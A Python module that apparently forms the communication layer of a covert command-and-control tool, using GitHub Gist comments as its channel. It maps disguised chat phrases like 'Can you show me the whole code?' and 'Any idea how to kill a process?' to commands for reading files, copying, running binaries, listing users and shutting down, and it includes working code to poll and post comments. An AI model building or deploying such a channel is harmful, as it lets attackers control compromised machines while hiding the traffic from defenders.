from github import Github
from github.GistComment import GistComment
from typing import List

class Connection:
    REQ_PING = "Can you tell me why is this causing the code to crash?"
    RES_PING = "Because the reciever fell asleep and missed the message"

    REQ_USERS = "Are you the only one working on this code?"
    RES_USERS = "Yep, just me :)"

    REQ_CONTENT = "Can you show me the whole code?"
    RES_CONTENT = "Just a sec."

    REQ_ID = "Can you identify the problem here?"
    RES_ID = "I will try, but no promisses"

    REQ_COPY = "Where sholud I transfer to python or Java"
    RES_COPY = "C++ ofcourse"

    REQ_BINARY = "What is running faster Linux or Windows"
    RES_BINARY = "Linux duhhh"

    REQ_READ = "Why can't I write files using this code??"
    RES_READ = "Because that code is for reading"

    REQ_SHUT_OFF = "Any idea how to kill a process?"
    RES_SHUT_OFF = "Just unplug the computer"

    def __init__(self, token: str, gistID: str):
        self.connector = Github(token)
        self.gistID = self.connector.get_gist(gistID)
        self.last_comment = 0

    def check_comments(self) -> List[GistComment]:
        try:
            comments = list(self.gistID.get_comments())
        except Exception:
            comments = []

        fresh = []

        if not comments:
            return fresh

        for comm in comments:
            if comm.id > self.last_comment:
                fresh.append(comm)
        
        self.last_comment = comments[len(comments) - 1].id

        return fresh
    
    def send_msg(self, message: str) -> GistComment:
        fresh = self.gistID.create_comment(message)
        self.last_comment = fresh.id
        return fresh